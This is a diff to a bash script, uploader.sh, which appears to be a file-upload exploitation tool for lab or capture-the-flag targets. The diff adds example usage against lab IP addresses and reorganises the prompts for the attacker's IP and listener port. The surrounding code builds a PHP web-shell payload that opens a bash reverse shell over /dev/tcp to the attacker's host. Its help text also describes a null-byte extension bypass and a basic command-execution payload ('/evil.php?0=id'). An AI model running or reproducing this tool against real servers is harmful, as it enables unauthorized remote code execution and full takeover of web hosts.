@@ -13,6 +13,9 @@ Help()
 	echo -e "-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.\n\n"
 	echo -e "-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.\n\n"
 	echo -e "-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e"
+	echo -e "$line\n[Example Usage]\n"
+	echo "./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png"
+	echo -e "\n./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b"
 
 }
 
@@ -74,18 +77,6 @@ then
 	read form_field
 fi
 
-if [[ -z "$ip" ]]
-then
-	echo -e "\nEnter your IP Address:\n"
-	read ip
-fi
-
-if [[ -z "$port" ]]
-then
-	echo -e "\nEnter your listner's port:\n"
-	read port
-fi
-
 if [[ -z "$allowed" ]]
 then
 	allowed="jpg"
@@ -95,6 +86,21 @@ fi
 
 if [[ -z "$payload" ]]
 then
+
+	if [[ -z "$ip" ]]
+	then
+		echo -e "\n[Listing Detected Interfaces]\n"
+		ip -c a
+		echo -e "\nEnter your IP Address:\n"
+		read ip
+	fi
+
+	if [[ -z "$port" ]]
+	then
+		echo -e "\nEnter your listner's port:\n"
+		read port
+	fi
+
 	payload='<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/'"$ip"'/'"$port"' 0>&1'"'"'");?>'
 fi
 
